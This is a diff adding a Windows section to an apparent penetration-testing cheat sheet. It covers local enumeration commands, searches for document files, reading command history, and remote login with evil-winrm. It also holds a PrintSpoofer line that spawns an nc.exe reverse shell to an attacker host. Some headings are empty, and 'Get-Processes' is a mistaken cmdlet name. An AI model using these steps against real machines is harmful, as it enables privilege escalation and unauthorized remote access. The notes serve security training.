@@ -1228,9 +1228,163 @@ With this, impacket will try to relay our hash to other machine with ip is `serv
 
 ## Windows
 
+Connect to windows machine:
+```
+xfreerdp /v:$rhosts /u:username /p:password /drive:.,share
+```
+
+Update windows-exploit-suggester:
+```
+sudo python2.7 windows-exploit-suggester.py --update
+```
+
+Using Windows Exploit Suggester
+```
+python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
+```
+
 ### Manual
 
+Username:
+```
+whoami
+```
+```
+Get-LocalUser
+```
+
+Groups username is in:
+```
+whoami /groups
+```
+```
+Get-LocalGroup
+```
+
+Get all system users:
+```
+net user
+```
+
+Information about a group:
+```
+Get-LocalGroupMember GroupName
+```
+
+Get password policy:
+```
+net accounts
+```
+
+System Information:
+```
+systeminfo
+```
+
+Get patches and updates:
+```
+wmic qfe
+```
+
+List all network interfaces:
+```
+ipconfig /all
+```
+
+Print routing table:
+```
+route print
+```
+
+List all active network connections:
+```
+netstat -ano
+```
+
+We can query two registry keys756 to list both 32-bit and 64-bit applications in the Windows Registry:
+For 32-bit:
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+For 64-bit:
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
+Check processes running in machine:
+```
+Get-Processes
+```
+
+Find some files with extension txt and ini from `C:\`  directory:
+```
+Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+```
+
+This one searches for a lot of extentions:
+```
+Get-ChildItem -Path C:\Users\user\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Try to run some commands as another user (this on pops another terminal so you show use Windows GUI):
+```
+runas /user:user cmd
+```
+
+Read command history:
+```
+Get-History
+```
+
+```
+(Get-PSReadlineOption).HistorySavePath
+type output
+```
+
+Enter as another user:
+```
+$password = ConvertTo-SecureString "password" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("username", $password)
+Enter-PSSession -ComputerName ComputerName -Credential $cred
+```
+
+Using evil-winrm:
+```
+evil-winrm -i 192.168.50.220 -u username -p "password"
+```
+
 ### Automated
+Using winPEAS
+
+### Windows Services
+
+#### Hijack service Binaries
+
+#### Hijack service DLLs
+
+#### Abuse Unquoted service paths
+
+### Other Components
+
+#### Scheduled Tasks
+```
+schtasks /query /fo LIST /v
+```
+
+```
+Get-ScheduledTask | select TaskName,State
+```
+
+#### SeImpersonate Privilege
+
+PrintSpoofer64
+```
+.\PrintSpoofer.exe -c "c:\path\to\nc.exe $lhost $lport -e cmd"
+```
+
+[GodPotato](https://github.com/BeichenDream/GodPotato)
+
+
 
 ## Linux
 
